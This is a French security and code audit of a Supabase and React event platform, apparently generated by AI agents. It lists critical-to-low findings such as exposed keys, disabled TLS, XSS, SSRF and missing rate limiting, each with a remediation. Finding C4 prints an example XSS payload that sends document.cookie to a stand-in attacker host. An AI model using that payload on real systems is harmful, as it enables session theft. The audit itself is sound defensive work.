# AUDIT EXHAUSTIF — SIB 2026 Platform
**Date :** 15 avril 2026  
**Agents lancés :** 8 (Sécurité · Code · Performance · Données · Accessibilité · Dépendances+Tests · Observabilité · Mobile+API)  
**Fichiers analysés :** 300+ fichiers  

---

## TABLE DES MATIÈRES
1. [CRITIQUE — Action immédiate](#critique)
2. [HAUTE PRIORITÉ — Ce sprint](#haute-priorite)
3. [PRIORITÉ MOYENNE — À planifier](#moyenne)
4. [BASSE PRIORITÉ — Backlog](#basse)
5. [Vérifications réussies ✅](#passes)
6. [Plan d'action consolidé](#plan-action)

---

## 1. CRITIQUE — Action immédiate {#critique}

> Ces problèmes DOIVENT être corrigés avant toute mise en production. Certains nécessitent une action dans les prochaines heures.

---

### [C1] 🔑 CREDENTIALS SUPABASE EXPOSÉES DANS LE DÉPÔT GIT
**Agents :** Mobile+API, Observabilité  
**Fichiers :** `.env` (lignes 2, 4), `urbaevent/.../SupabaseConfig.dart`

Le fichier `.env` est commité avec les vraies clés Supabase :
- `VITE_SUPABASE_ANON_KEY` — accès direct à la DB depuis n'importe où
- `SUPABASE_SERVICE_ROLE_KEY` — **contourne TOUTES les politiques RLS**

De plus, l'app Flutter a ces clés en dur dans `SupabaseConfig.dart` (extractibles depuis l'APK).

**Risque :** Compromission totale de la base de données.  
**Action :**
1. Révoquer et régénérer immédiatement les deux clés dans le dashboard Supabase
2. Ajouter `.env` au `.gitignore` et purger l'historique git si nécessaire
3. Créer `.env.example` avec des valeurs placeholder
4. Pour Flutter : utiliser `--dart-define=SUPABASE_KEY=xxx` à la compilation

---

### [C2] 🔒 TLS DÉSACTIVÉ — RISQUE MITM SUR SMTP ET BASE DE DONNÉES
**Agent :** Sécurité  
**Fichiers :** `server.js` (ligne 99), `server/auth-server.js` (ligne 54)

```js
// server.js — SMTP
tls: { rejectUnauthorized: false }

// auth-server.js — PostgreSQL
ssl: { rejectUnauthorized: false }
```

Toute communication vers le serveur mail et la base de données est vulnérable à une interception MITM.

**Fix :**
```js
tls: { rejectUnauthorized: process.env.NODE_ENV === 'production' }
```

---

### [C3] 💥 STACK TRACE EXPOSÉE DANS LES RÉPONSES API
**Agent :** Sécurité  
**Fichier :** `server.js` (ligne ~515)

```js
res.status(500).json({ success: false, error: error.message, stack: error.stack });
```

Expose les chemins internes, la structure du code, les versions de librairies.

**Fix :**
```js
console.error('Error:', error.stack); // log côté serveur uniquement
res.status(500).json({ success: false, error: 'Internal server error' });
```

---

### [C4] 🛡️ XSS DANS LES TEMPLATES D'EMAIL
**Agent :** Sécurité, Mobile+API  
**Fichier :** `server.js` (lignes ~213, ~186)

Le `message` du formulaire de contact est inséré directement dans le HTML sans sanitisation :
```js
<p style="white-space: pre-wrap;">${message}</p>
```
Un attaquant peut injecter `<img src=x onerror="fetch('attacker.com?c='+document.cookie)">`.

**Fix :** Utiliser `escapeHtml(message)` (utilitaire déjà présent dans `src/utils/sanitizeHtml.ts`).

---

### [C5] ⚡ AUCUN RATE LIMITING SUR LES ENDPOINTS
**Agent :** Sécurité, Mobile+API  
**Fichier :** `server.js`

Aucune des routes n'a de protection :
- `/api/send-email` → spam d'emails illimité
- `/api/contact` → DoS + spam
- `/api/admin/exhibitors/:id` → bruteforce sur suppression admin

**Fix :**
```bash
npm install express-rate-limit
```
```js
import rateLimit from 'express-rate-limit';
app.post('/api/send-email', rateLimit({ windowMs: 15*60*1000, max: 5 }), handler);
app.post('/api/contact', rateLimit({ windowMs: 60*60*1000, max: 10 }), handler);
```

---

### [C6] 💳 PAIEMENT NON-ATOMIQUE — RISQUE DE CORRUPTION DE DONNÉES
**Agent :** Données  
**Fichier :** `src/services/paymentService.ts` (lignes ~233-258)

`upgradeUserToVIP()` effectue deux `UPDATE` séparés :
1. `users.visitor_level = 'premium'`
2. `payment_requests.status = 'approved'`

Si l'opération 1 réussit et que l'opération 2 échoue (réseau, timeout), l'utilisateur a le niveau VIP sans paiement validé.

**Fix :** Créer une fonction RPC Supabase qui met à jour les deux tables dans une seule transaction :
```sql
CREATE OR REPLACE FUNCTION approve_visitor_payment(p_user_id uuid, p_payment_id uuid)
RETURNS void LANGUAGE plpgsql AS $$
BEGIN
  UPDATE users SET visitor_level = 'premium' WHERE id = p_user_id;
  UPDATE payment_requests SET status = 'approved' WHERE id = p_payment_id;
END;
$$;
```

---

### [C7] 🕵️ SSRF DANS L'EDGE FUNCTION DE SCRAPING
**Agent :** Sécurité  
**Fichier :** `supabase/functions/scrape-and-create-minisite/index.ts` (ligne ~41)

L'URL fournie par l'utilisateur est fetchée sans validation :
```js
const response = await fetch(websiteUrl, { ... });
```
Un attaquant peut accéder à : `http://169.254.169.254/` (métadonnées AWS), `http://localhost/`, réseau interne.

**Fix :** Valider l'URL avant de fetcher (rejeter localhost, plages IP privées, protocoles non-http/https).

---

### [C8] 🚫 SENTRY NON INITIALISÉ EN PRODUCTION
**Agent :** Observabilité  
**Fichier :** `src/lib/sentry.ts` (défini), `src/main.tsx` (jamais appelé)

`initializeSentry()` est configuré mais n'est jamais invoqué. Aucune erreur de production n'est capturée.

**Fix :**
```ts
// src/main.tsx — avant ReactDOM.createRoot
import { initializeSentry } from './lib/sentry';
initializeSentry();
```
Et ajouter `VITE_SENTRY_DSN` dans Railway.

---

### [C9] 🗺️ SOURCE MAPS ACTIVÉES EN PRODUCTION
**Agent :** Observabilité, Sécurité  
**Fichier :** `vite.config.ts` (ligne ~126)

```ts
sourcemap: true  // expose le code source en production
```

**Fix :**
```ts
sourcemap: mode === 'development',
```

---

### [C10] 🔑 SECRETS DANS `vercel.json`
**Agent :** Observabilité  
**Fichier :** `vercel.json` (lignes 12-20)

Clés Supabase et `VITE_SHOW_DEMO_LOGINS=true` codées en dur dans le fichier de config Vercel commité.

**Fix :** Utiliser les Variables d'Environnement dans le dashboard Vercel, supprimer du fichier.

---

## 2. HAUTE PRIORITÉ — Ce sprint {#haute-priorite}

---

### [H1] 📦 VULNÉRABILITÉS DE DÉPENDANCES
**Agent :** Dépendances  

| Package | Version | CVE | Sévérité | Fix |
|---------|---------|-----|----------|-----|
| `xlsx` | 0.18.5 | GHSA-4r6h-8v6p-xvw6 | **HIGH** (CVSS 7.8) | `npm update xlsx` |
| `dompurify` | 3.2.3 | GHSA-39q2-94rc-95cp | **MODERATE** | `npm update dompurify` |

Le `xlsx` est utilisé côté client (`exportService.ts`) — prototype pollution exploitable par un fichier Excel malveillant uploadé.

---

### [H2] 🗃️ CONTRAINTES DB MANQUANTES
**Agent :** Données  

```sql
-- FK manquante : exhibitors → users
ALTER TABLE exhibitors ADD CONSTRAINT exhibitors_user_id_fk
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;

-- CHECK manquant sur le type utilisateur
ALTER TABLE users ADD CONSTRAINT users_type_check
  CHECK (type IN ('exhibitor', 'partner', 'visitor', 'admin', 'security'));

-- CHECK manquant sur le niveau visiteur
ALTER TABLE users ADD CONSTRAINT users_visitor_level_check
  CHECK (visitor_level IS NULL OR visitor_level IN ('free', 'premium', 'vip'));

-- UNIQUE manquant sur les badges
ALTER TABLE user_badges ADD CONSTRAINT user_badges_user_id_unique UNIQUE (user_id);

-- UNIQUE manquant sur les réservations (double-booking)
ALTER TABLE appointments ADD CONSTRAINT appointments_slot_visitor_unique
  UNIQUE (visitor_id, time_slot_id);
```

---

### [H3] 🔐 POLITIQUES RLS INCOMPLÈTES
**Agent :** Données  

| Table | Manque |
|-------|--------|
| `payment_requests` | Aucune politique SELECT (fuite de données de paiement) |
| `time_slots` | Pas de politique INSERT/UPDATE/DELETE |
| `users` | Pas de politique DELETE |
| `partners` | DELETE manquant |

```sql
-- Exemple : SELECT sur payment_requests
CREATE POLICY "payment_requests_select_own" ON payment_requests
  FOR SELECT USING (user_id = auth.uid());
```

---

### [H4] 🔄 MIGRATIONS CONFLICTUELLES POUR `book_appointment_atomic()`
**Agent :** Données  

Trois versions incompatibles existent dans `supabase/migrations/` :
- 20251030 : signature A
- 20251224 : signature B (ordre différent)
- 20260118 : signature C (complètement différente)

La dernière version écrase les précédentes, comportement imprévisible.

**Fix :** Garder uniquement la version 20260118, documenter la signature officielle.

---

### [H5] 🌐 CORS TROP PERMISSIF
**Agent :** Sécurité  
**Fichier :** `server.js` (lignes 43-54)

Les URLs Vercel preview (`sib.vercel.app`, `sib-2026.vercel.app`) autorisent des déploiements preview potentiellement non-sécurisés.

**Fix :** En production, restreindre à `['https://www.sib2026.ma', 'https://app.sib2026.ma']` uniquement.

---

### [H6] 🛡️ ABSENCE DE PROTECTION CSRF
**Agent :** Sécurité  

Les endpoints POST/DELETE n'ont pas de token CSRF. Un admin peut être manipulé pour supprimer des exposants via une page malveillante.

**Fix :** Ajouter `csurf` middleware sur toutes les routes qui modifient des données.

---

### [H7] 📱 CLÉS FIREBASE MANQUANTES — PUSH NOTIFICATIONS NON FONCTIONNELLES
**Agent :** Mobile+API  
**Fichier :** `src/services/pushNotificationService.ts`

Toutes les valeurs Firebase sont des placeholders `"local-dev"`. Les notifications push ne fonctionnent pas en production.

---

### [H8] ♿ MODALES SANS ATTRIBUTS ARIA (WCAG 2.1 Level A)
**Agent :** Accessibilité  
**Fichier :** `src/components/ui/Dialog.tsx`, `src/components/.../*Modal.tsx`

- Pas de `role="dialog"` ni `aria-modal="true"`
- Pas de `aria-labelledby` vers le titre
- Pas de FocusTrap (le composant existe dans `src/components/accessibility/FocusTrap.tsx` mais n'est pas utilisé)
- Pas de restauration du focus à la fermeture

---

### [H9] 🌍 RTL CASSÉ POUR L'ARABE
**Agent :** Accessibilité  
**Fichier :** `src/store/languageStore.ts` (ligne ~81)

```ts
document.documentElement.dir = 'ltr'; // hardcodé — ne passe jamais en RTL
```

Conflit avec `App.tsx` qui a la logique correcte. L'arabe n'est pas dans `supportedLanguages`.

---

### [H10] 🔥 FIREBASE 500KB — DÉPENDANCE INUTILISÉE
**Agent :** Performance, Dépendances  

Firebase (~1.2MB minifié, ~500KB gzippé) est importé alors que Supabase OAuth gère déjà Google Auth. Aucun avantage réel.

**Fix :** Supprimer `firebase` de `package.json`, migrer vers Supabase OAuth.

---

### [H11] 📊 MOTEUR DE RECOMMANDATION O(n²)
**Agent :** Performance  
**Fichier :** `src/services/recommendationService.ts`

Itère sur TOUS les utilisateurs en mémoire pour chaque requête de recommandation. Pour 1000 utilisateurs = 1M d'opérations côté client.

**Fix :** Implémenter côté serveur (Edge Function Supabase) avec un algorithme indexé.

---

### [H12] 🧪 COUVERTURE DE TESTS : ~15% — CHEMINS CRITIQUES NON TESTÉS
**Agent :** Dépendances+Tests  

| Service | Tests unitaires |
|---------|----------------|
| `twoFactorAuthService.ts` | **ZÉRO** |
| `paymentService.ts` | 2 constantes seulement |
| `transactionService.ts` | **ZÉRO** |
| `auditService.ts` | **ZÉRO** |
| `securityService.ts` | **ZÉRO** |
| `roleVerificationService.ts` | **ZÉRO** |
| Tests de race conditions | **ZÉRO** |

---

## 3. PRIORITÉ MOYENNE — À planifier {#moyenne}

---

### [M1] 🏗️ CODE MORT — 6 FICHIERS "OPTIMIZED" INUTILISÉS
**Agent :** Code  

Ces fichiers existent mais ne sont jamais importés :
- `src/pages/ExhibitorsPageOptimized.tsx`
- `src/pages/admin/ExhibitorsPageOptimized.tsx`
- `src/pages/NewsPageOptimized.tsx`
- `src/pages/admin/EventsPageOptimized.tsx`
- `src/pages/admin/PartnersPageOptimized.tsx`
- `src/pages/admin/UsersPageOptimized.tsx`
- `src/services/qrCodeServiceOptimized.ts`

**Fix :** Supprimer ou intégrer les améliorations dans les versions principales.

---

### [M2] 📝 192 USAGES DE `any` EN TYPESCRIPT
**Agent :** Code  
**Fichier :** `eslint.config.js` — `@typescript-eslint/no-explicit-any: 'off'`

Passer la règle en `'warn'` pour réduire progressivement. 15 fichiers ont des `@ts-ignore`.

---

### [M3] 🖥️ 301 `console.log` EN PRODUCTION
**Agent :** Code, Observabilité  

Un logger centralisé existe (`src/utils/logger.ts`) mais n'est pas utilisé. Les logs Supabase keys partielles apparaissent dans les logs Railway.

```js
// server.js ligne ~430 — log d'un secret partiel
process.env.SUPABASE_SERVICE_ROLE_KEY.substring(0, 10) // ← à supprimer
```

---

### [M4] 🔄 30+ REQUÊTES `select('*')` SANS PAGINATION
**Agent :** Performance  

Fichiers impactés : `supabaseService.ts` (~15 fois), `adminMetrics.ts`, `articleAudioService.ts`.  
Sélectionner uniquement les colonnes nécessaires réduit le temps de requête de ~30%.

---

### [M5] ♻️ STORE ZUSTAND NON-GRANULAIRE — RE-RENDERS EXCESSIFS
**Agent :** Performance  

19 stores Zustand avec abonnements globaux. `AdminDashboard.tsx` (42KB compilé) se re-render entièrement à chaque changement de métrique.

**Fix :** Utiliser des sélecteurs granulaires : `useStore(state => state.specificField)`.

---

### [M6] 💰 TAUX DE CHANGE CODÉS EN DUR
**Agent :** Sécurité  
**Fichier :** `src/services/partnerPaymentService.ts` (lignes 19-21)

```js
const EUR_TO_MAD_RATE = 11; // statique depuis le début du projet
```

Cause des écarts de paiement. Doit être mis à jour via une API de taux de change.

---

### [M7] 🎯 VALIDATION QR CODE INSUFFISANTE
**Agent :** Mobile+API  
**Fichier :** `src/pages/BadgeScannerPage.tsx` (lignes ~262-269)

Les données scannées sont parsées en JSON et passées au RPC sans validation de longueur ni de format.

---

### [M8] 🔢 ABSENCE DE VERSIONING API
**Agent :** Mobile+API  

Tous les endpoints sont `/api/xxx` sans version. Un changement breaking affecte immédiatement toutes les apps mobiles.

**Fix :** Préfixer `/api/v1/xxx` dès maintenant.

---

### [M9] 📐 CONTRASTE DE COULEUR INSUFFISANT
**Agent :** Accessibilité  

La couleur `sib-gold` (#C9A84C) sur fond blanc a un ratio de contraste ~2.4:1 (WCAG AA minimum : 4.5:1 pour texte normal).

---

### [M10] 🔗 DUPLICATE QR CODE LIBRARIES (3 librairies pour la même chose)
**Agent :** Dépendances  

- `html5-qrcode` (scan)
- `qrcode` (génération)  
- `qrcode.react` (wrapper React pour génération)

Garder : `html5-qrcode` + `qrcode.react` uniquement. Supprimer `qrcode`. Économie : ~50KB.

---

### [M11] 🏥 HEALTH CHECK INSUFFISANT
**Agent :** Observabilité  
**Fichier :** `server.js` — `/api/health`

Retourne uniquement `{ status: 'ok', timestamp }`. Ne vérifie pas la DB, le SMTP, la mémoire.

---

### [M12] 📋 JOURNALISATION NON STRUCTURÉE
**Agent :** Observabilité  

Tout le backend utilise `console.log()`. Impossible d'agréger les logs dans ELK/Datadog.

**Fix :** Migrer vers Winston ou Pino avec sortie JSON.

---

### [M13] 🔄 PAS DE STRATÉGIE DE ROLLBACK
**Agent :** Observabilité  

La checklist de déploiement ne documente pas comment rollback une migration DB ou un déploiement Railway.

---

### [M14] 🔌 URL API AVEC FALLBACK LOCALHOST EN PRODUCTION
**Agent :** Observabilité  
**Fichier :** `src/services/api/client.ts` (ligne ~27)

```js
const API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:3000/api';
```

En production si la variable manque, toutes les requêtes vont sur localhost.

---

## 4. BASSE PRIORITÉ — Backlog {#basse}

---

### [L1] Deux dossiers context/ et contexts/ — consolider
**Fichiers :** `src/context/`, `src/contexts/`

### [L2] 50+ services à plat — regrouper par domaine
Créer `src/services/auth/`, `src/services/payment/`, `src/services/notification/`, etc.

### [L3] `duplicate storageService.ts` et `storage/storageService.ts`
Vérifier lequel est le canonique et supprimer l'autre.

### [L4] Index DB manquants pour les requêtes fréquentes
```sql
CREATE INDEX idx_users_type ON users(type);
CREATE INDEX idx_appointments_exhibitor_status ON appointments(exhibitor_id, status);
CREATE INDEX idx_time_slots_exhibitor_date ON time_slots(exhibitor_id, date);
CREATE INDEX idx_users_email_type ON users(LOWER(email), type);
```

### [L5] Soft-delete non standardisé
Certaines tables ont `deleted_at`, d'autres non. Standardiser.

### [L6] Pas de fichier `security.txt`
Créer `public/.well-known/security.txt` avec l'email de contact sécurité.

### [L7] Log partiel d'une clé secrète
**Fichier :** `server.js` ligne ~430 — `SUPABASE_SERVICE_ROLE_KEY.substring(0, 10)` dans les logs.

### [L8] Gestion hors-ligne pour le scan QR mobile
Implémenter une file IndexedDB pour les scans en attente (mauvais réseau lors de l'événement).

### [L9] Cache mobile stocké dans localStorage
Utiliser le plugin Capacitor Storage (chiffré) au lieu de `localStorage` pour les tokens.

### [L10] Email de normalisation en minuscules manquant
`auth-server.js` fait `.eq('email', email)` sans `.toLowerCase()` — risque de doublons de comptes.

---

## 5. Vérifications réussies ✅ {#passes}

Ces éléments sont correctement implémentés et représentent de bonnes pratiques :

| # | Contrôle | Détail |
|---|----------|--------|
| ✅ | **Validation mot de passe forte** | 12+ chars, maj, min, chiffre, spécial (registrationService.ts) |
| ✅ | **Magic bytes sur les uploads** | Vérification des 12 premiers octets du fichier (fileValidator.ts) |
| ✅ | **SQL injection impossible** | Supabase utilise des requêtes paramétrées systématiquement |
| ✅ | **JWT vérifié côté serveur** | Token + expiration + statut utilisateur (auth-server.js) |
| ✅ | **Noms de fichiers dangereux bloqués** | Regex contre `../`, `<>:"/\|?*` (fileValidator.ts) |
| ✅ | **HTTPS forcé en production** | Redirection HTTP→HTTPS + HSTS 1 an (server.js) |
| ✅ | **En-têtes de sécurité basiques** | X-Content-Type-Options, X-Frame-Options, X-XSS-Protection (server.js) |
| ✅ | **CORS avec whitelist** | Pas de wildcard `*` (server.js) |
| ✅ | **2FA avec verrouillage** | 30 min de lockout après 5 échecs (twoFactorAuthService.ts) |
| ✅ | **Vérification admin robuste** | Double vérification : token JWT + SELECT sur users.type (server.js) |
| ✅ | **PayPal webhook signé** | Signature HMAC vérifiée (supabase/functions/paypal-webhook) |
| ✅ | **Code splitting + lazy loading** | Toutes les pages via `lazyRetry()` + Suspense (App.tsx) |
| ✅ | **TypeScript strict mode** | `strict: true` dans tsconfig.app.json |
| ✅ | **Error Boundary global** | Catch React + fallback UI + Sentry optionnel (ErrorBoundary.tsx) |
| ✅ | **Service role key pas dans le client** | vite.config.ts l'exclut explicitement du bundle frontend |
| ✅ | **Skip navigation link** | SkipToContent.tsx correctement implémenté (App.tsx) |
| ✅ | **Migrations versionnées** | 19+ fichiers SQL timestampés dans supabase/migrations/ |
| ✅ | **Metrics server protégé** | Token Authorization requis + validation 32 chars (metrics-server.js) |
| ✅ | **prefers-reduced-motion** | Media query CSS implémentée (index.css) |
| ✅ | **book_appointment_atomic() avec verrou** | Pessimistic lock FOR UPDATE dans la fonction RPC |
| ✅ | **DOMPurify configuré** | Whitelist stricte de tags/attributs (sanitizeHtml.ts) |

---

## 6. PLAN D'ACTION CONSOLIDÉ {#plan-action}

### ⛔ P0 — Aujourd'hui (< 24h)

| # | Action | Fichier |
|---|--------|---------|
| 1 | **Révoquer** les clés Supabase exposées + régénérer | dashboard Supabase |
| 2 | Ajouter `.env` au `.gitignore` + créer `.env.example` | repo |
| 3 | Supprimer les clés de `vercel.json` → Variables Vercel | `vercel.json` |
| 4 | Externaliser les clés dans le code Flutter | `SupabaseConfig.dart` |
| 5 | Corriger `tls: { rejectUnauthorized: false }` | `server.js`, `auth-server.js` |
| 6 | Supprimer `error.stack` de la réponse API | `server.js:515` |
| 7 | Échapper `${message}` dans les templates email | `server.js:213` |

### 🔴 P1 — Cette semaine (Sprint)

| # | Action | Effort |
|---|--------|--------|
| 8 | Ajouter `express-rate-limit` sur tous les endpoints | 2h |
| 9 | Implémenter `initializeSentry()` dans `main.tsx` | 30min |
| 10 | Passer `sourcemap: false` en production | 15min |
| 11 | `npm update xlsx dompurify` | 30min |
| 12 | Créer fonction RPC pour paiement atomique | 2h |
| 13 | Ajouter les contraintes DB manquantes (FK, CHECK, UNIQUE) | 3h |
| 14 | Ajouter les RLS manquantes (payment_requests, time_slots) | 2h |
| 15 | Fixer `languageStore.ts` ligne 81 (RTL) | 30min |
| 16 | Ajouter `role="dialog"` + FocusTrap aux modales | 4h |
| 17 | Ajouter rate limiting + validation QR scan | 2h |

### 🟡 P2 — Prochain sprint

| # | Action | Effort |
|---|--------|--------|
| 18 | Écrire tests unitaires : `twoFactorAuthService`, `paymentService`, `auditService` | 8h |
| 19 | Supprimer `firebase` + migrer vers Supabase OAuth | 4h |
| 20 | Supprimer les 7 fichiers "Optimized" dead code | 1h |
| 21 | Migrer vers `logger.ts` (supprimer console.log) | 4h |
| 22 | Passer `sourcemap: false` + valider build | 1h |
| 23 | Optimiser les `select('*')` → colonnes spécifiques | 4h |
| 24 | Consolider les migrations `book_appointment_atomic()` | 2h |
| 25 | Améliorer le health check `/api/health` | 2h |
| 26 | Ajouter versioning API `/api/v1/` | 3h |

### 🟢 P3 — Mois suivant

| # | Action |
|---|--------|
| 27 | Implémenter moteur de recommandation côté serveur (Edge Function) |
| 28 | Migrer vers Winston/Pino pour logs structurés JSON |
| 29 | Documenter stratégie de rollback |
| 30 | Créer indexes DB manquants |
| 31 | Corriger contraste couleur sib-gold |
| 32 | Tests de race conditions (bookings concurrents) |
| 33 | Consolider les librairies QR (2 au lieu de 3) |
| 34 | Implémenter APM (Sentry Performance) |

---

## SCORE GLOBAL PAR DOMAINE

| Domaine | Score | Niveau |
|---------|-------|--------|
| **Sécurité** | 52/100 | ⚠️ CRITIQUE (credentials exposées) |
| **Intégrité des données** | 72/100 | 🟡 MOYEN |
| **Performance** | 65/100 | 🟡 MOYEN |
| **Qualité du code** | 74/100 | 🟡 BON |
| **Accessibilité** | 68/100 | 🟡 MOYEN |
| **Tests** | 35/100 | 🔴 INSUFFISANT |
| **Observabilité** | 48/100 | 🔴 FAIBLE |
| **Mobile/API** | 55/100 | ⚠️ CRITIQUE (clés exposées) |
| **Dépendances** | 70/100 | 🟡 MOYEN |

**Score global : 60/100**

---

*Rapport généré le 15 avril 2026 — SIB 2026 Platform Audit*  
*8 agents spécialisés · 300+ fichiers analysés · 9 domaines couverts*
